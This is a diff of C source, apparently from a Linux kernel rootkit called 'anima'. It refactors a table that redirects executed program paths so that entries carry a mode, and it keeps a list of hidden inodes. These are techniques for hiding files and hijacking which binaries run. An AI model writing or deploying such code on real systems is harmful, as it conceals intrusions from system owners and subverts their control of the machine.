@@ -1,6 +1,7 @@
 #include <linux/printk.h>
 
 #include <anima/config.h>
+#include <anima/hide_file.h>
 #include <anima/libc.h>
 
 static u64 hidden_inodes[MAX_HIDDEN_INODES] = {0};
@@ -37,28 +38,23 @@ void unhide_inode(u64 ino)
 	}
 }
 
-struct redirect_path {
-	/* alloced via vmalloc */
-	char *old_path;
-	unsigned int old_path_len;
-	char *new_path;
-	unsigned int new_path_len;
-};
+static struct redirect_path redirect_pathes[MAX_REDIRECT_EXECVE] = { {0, NULL, 0, NULL, 0} };
 
-struct redirect_path redirect_pathes[MAX_REDIRECT_EXECVE] = { {NULL, 0, NULL, 0} };
-
-char *redirect_execve(char *old_path)
+char *get_redirect_path(char *old_path, int mode)
 {
-	for (int i = 0; i < MAX_REDIRECT_EXECVE; i++)
-		if (redirect_pathes[i].old_path
-		    && !anima_strcmp(redirect_pathes[i].old_path, old_path))
-			return redirect_pathes[i].new_path;
+	for (int i = 0; i < MAX_REDIRECT_EXECVE; i++) {
+		struct redirect_path *r = redirect_pathes + i;
+		if (!r->old_path)
+			continue;
+		if (!anima_strcmp(r->old_path, old_path) && r->mode == mode)
+			return r->new_path;
+	}
 
 	return NULL;
 }
 
-void redirect_execve_path(char *old_path, unsigned int old_path_len,
-			  char *new_path, unsigned int new_path_len)
+void redirect_path(char *old_path, unsigned int old_path_len,
+		   char *new_path, unsigned int new_path_len, int mode)
 {
 	char *kold_path, *knew_path;
 
@@ -78,9 +74,11 @@ void redirect_execve_path(char *old_path, unsigned int old_path_len,
 	pr_debug("%s: redirect %s to %s\n", __func__, kold_path, knew_path);
 
 	for (int i = 0; i < MAX_REDIRECT_EXECVE; i++) {
-		if (!redirect_pathes[i].old_path) {
-			redirect_pathes[i].old_path = kold_path;
-			redirect_pathes[i].new_path = knew_path;
+		struct redirect_path *r = redirect_pathes + i;
+		if (!r->old_path) {
+			r->mode = mode;
+			r->old_path = kold_path;
+			r->new_path = knew_path;
 			goto out;
 		}
 	}
@@ -92,7 +90,7 @@ out:
 	return;
 }
 
-void unredirect_execve_path(const char *old_path, unsigned int len)
+void unredirect_path(const char *old_path, unsigned int len, int mode)
 {
 	char *kold_path;
 
@@ -106,12 +104,15 @@ void unredirect_execve_path(const char *old_path, unsigned int len)
 	pr_debug("%s: unredirect %s\n", __func__, kold_path);
 
 	for (int i = 0; i < MAX_REDIRECT_EXECVE; i++) {
-		if (redirect_pathes[i].old_path
-		    && !anima_strcmp(redirect_pathes[i].old_path, kold_path)) {
-			anima_vfree(redirect_pathes[i].old_path);
-			anima_vfree(redirect_pathes[i].new_path);
-			redirect_pathes[i].old_path = NULL;
-			redirect_pathes[i].new_path = NULL;
+		struct redirect_path *r = redirect_pathes + i;
+		if (!r->old_path)
+			continue;
+		if (!anima_strcmp(r->old_path, kold_path) && r->mode == mode) {
+			anima_vfree(r->old_path);
+			anima_vfree(r->new_path);
+			r->mode = 0;
+			r->old_path = NULL;
+			r->new_path = NULL;
 		}
 	}
 
